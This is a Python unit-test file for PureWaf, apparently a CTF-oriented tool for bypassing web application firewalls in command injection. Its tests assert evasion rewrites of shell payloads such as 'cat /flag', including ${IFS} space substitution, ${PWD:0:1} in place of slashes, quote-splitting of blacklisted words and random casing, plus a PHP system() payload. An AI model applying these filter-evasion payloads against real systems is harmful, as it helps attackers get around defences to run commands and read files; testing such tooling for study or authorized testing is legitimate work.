import os
import sys
import unittest


ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.insert(0, ROOT)

from PureWaf import bypass
from PureWaf import tamper
from PureWaf import utils


class TamperPluginTests(unittest.TestCase):
    def test_registry_contains_commix_inspired_plugins(self):
        names = {plugin.name for plugin in tamper.get_plugins()}

        for name in {
            "space2ifs",
            "space2htab",
            "space2plus",
            "slash2env",
            "singlequotes",
            "doublequotes",
            "backslashes",
            "uninitializedvariable",
            "randomcase",
        }:
            self.assertIn(name, names)

    def test_space_and_slash_tampers_are_contextual(self):
        regex_space = utils.parse_waf_regex("/ /")
        candidates = bypass._build_targeted_candidates(
            ["cat /flag"],
            [],
            set(),
            regex_space,
            payload_context="shell_command",
        )

        self.assertIn("cat${IFS}/flag", candidates)
        self.assertIn("cat\t/flag", candidates)
        self.assertIn("cat+/flag", candidates)

        regex_slash = utils.parse_waf_regex(r"/\//")
        candidates = bypass._build_targeted_candidates(
            ["cat /flag"],
            [],
            set(),
            regex_slash,
            payload_context="shell_command",
        )

        self.assertIn("cat ${PWD:0:1}flag", candidates)

    def test_word_tampers_break_blacklisted_words(self):
        candidates = bypass._build_targeted_candidates(
            ["cat /flag"],
            ["cat", "flag"],
            set(),
            None,
            payload_context="shell_command",
        )

        self.assertIn("c''a''t /f''l''a''g", candidates)
        self.assertIn('c""a""t /f""l""a""g', candidates)
        self.assertIn("c${PUREWAF_X}a${PUREWAF_X}t /f${PUREWAF_X}l${PUREWAF_X}a${PUREWAF_X}g", candidates)
        self.assertNotIn("c\\a\\t /f\\l\\a\\g", candidates)

    def test_manual_only_tampers_are_registered_but_not_auto_applied(self):
        backslashes = tamper.get_plugin("backslashes")
        randomcase = tamper.get_plugin("randomcase")
        self.assertIsNotNone(backslashes)
        self.assertIsNotNone(randomcase)
        self.assertFalse(backslashes.auto_apply)
        self.assertFalse(randomcase.auto_apply)
        self.assertIn("c\\a\\t /f\\l\\a\\g", list(backslashes.transform("cat /flag")))
        self.assertIn("CaT /fLaG", list(randomcase.transform("cat /flag")))

        candidates = bypass._build_targeted_candidates(
            ["ls /"],
            [],
            set(),
            utils.parse_waf_regex("/ls/i"),
            payload_context="shell_command",
        )

        self.assertNotIn(r"l\s /", candidates)
        self.assertNotIn("Ls /", candidates)

    def test_php_context_does_not_apply_shell_tampers(self):
        candidates = bypass._build_targeted_candidates(
            ["system('cat /flag');"],
            ["cat", "flag"],
            set(),
            None,
            payload_context="php_code",
        )

        self.assertEqual(candidates, ["system('cat /flag');"])

    def test_payload_technique_labels(self):
        payload = "cat${IFS}${PWD:0:1}flag"
        labels = bypass.infer_payload_techniques(payload)

        self.assertIn("tamper:space2ifs", labels)
        self.assertIn("tamper:slash2env", labels)

        record = bypass.build_payload_record(payload)
        self.assertEqual(record.payload, payload)
        self.assertEqual(record.techniques, labels)


if __name__ == "__main__":
    unittest.main()
